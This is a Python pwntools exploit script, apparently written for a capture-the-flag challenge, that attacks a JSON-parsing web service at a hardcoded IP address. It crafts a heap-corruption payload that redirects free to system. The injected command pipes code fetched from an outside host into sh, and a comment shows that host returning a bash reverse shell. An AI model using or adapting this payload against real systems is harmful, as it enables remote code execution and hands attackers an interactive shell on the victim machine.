from pwn import * 
import requests

# context.log_level='debug'
# context.terminal=['tmux', 'splitw', '-h']

# cn = process("./loader")

host = 'http://124.70.201.145:7777/'

cmd = '''
# b * Parser
# b * new_Object
b * delete_item
'''
def hhex(number):
    num = "{:0>16x}".format(number)
    tmp = [num[i:i+2] for i in range(0, 16, 2)][::-1]
    tmp2 = ["".join(tmp[i:i+2]) for i in range(0, 8, 2)]
    return "\\u" + "\\u".join(tmp2)


def printff(num):
    print("{:0>16x}".format(num))

# from /proc/self/maps
base = 0x7f872c6e2000
system     = base + 0x000000000002170
printf     = base + 0x000000000002230
free_got   = base + 0x000000000006028
bss = base + 0x00000000000632C


echohello = base + 0x0000000000004059


json = '''
{{
    "1": "aaaaaaa", 
    "2": "aaaaaaa", 
    "3": "aaaaaaa", 
    "4": "aaaaaaa", 
    "5": "aaaaaaa", 
    "6": "aaaaaaa", 
    "7": "aaaaaaa", 
    "8": "aaaaaaa", 
    "A": "aaaaaaa", 
    "A": "bbbbbbb",
    "A": 1, 
    "B": 2,
    "echo hello": "{pad1}\\\x00{pad2}{fake_item}"
}}
'''.format(
    pad1 = 'c' * 0x15, 
    pad2 = 'a'* (0x20 - 0x15), 
    # fake_item = "sh -i < /dev/tcp/81.69.0.47/9" + "\\u0000a" + hhex(echohello) + hhex(0) + hhex(printf) + hhex(free_got - 0x30)
    fake_item = "bash -c 'curl 1.14.92.160|sh'\\u0000"+'a'*1 + hhex(echohello) + hhex(0) + hhex(system) + hhex(free_got - 0x30)
)
'''
wlz@VM-0-4-ubuntu:~$ curl 1.14.92.160
bash -c '/bin/bash -i >& /dev/tcp/1.14.92.160/9999 0>&1'
'''


r = requests.post(host, data={'wishes': json})
print(r.status_code)
print(r.text)
print(json)

printff(system)
printff(printf)
printff(free_got)


# gdb.attach(cn, cmd)
# cn.sendline(json)
# cn.interactive()

